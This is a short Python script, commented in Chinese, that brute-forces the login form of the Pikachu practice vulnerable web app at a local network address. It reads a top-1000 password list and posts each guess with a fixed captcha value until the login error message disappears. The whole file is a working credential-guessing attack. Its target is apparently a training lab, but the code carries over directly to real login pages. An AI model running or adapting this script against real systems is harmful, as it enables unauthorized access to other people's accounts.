import requests

# 目标页面的URL
url = 'http://192.168.1.192:8086/pikachu/vul/burteforce/bf_form.php'

# 提交的用户名
username = input("账号名")
error_message = 'username or password is not exists～'
# 密码字典文件路径
password_file = 'top1000.txt'

# 打开密码字典文件
with open(password_file, 'r') as f:
    # 逐行读取密码
    for password in f:
        # 去除末尾的换行符
        password = password.strip()

        # 构建表单数据
        data = {
            'username': username,
            'password': password,
            'submit': 'Login',
            'vcode':'320q9a'
        }#需要手动构造payload

        # 发起POST请求，提交表单数据
        response = requests.post(url, data=data)

        # 检查响应结果，这里以判断页面内容为例
        if error_message not in response.text:
            print('密码破解成功：', password)
            break
        else:
            print('尝试密码：', password)
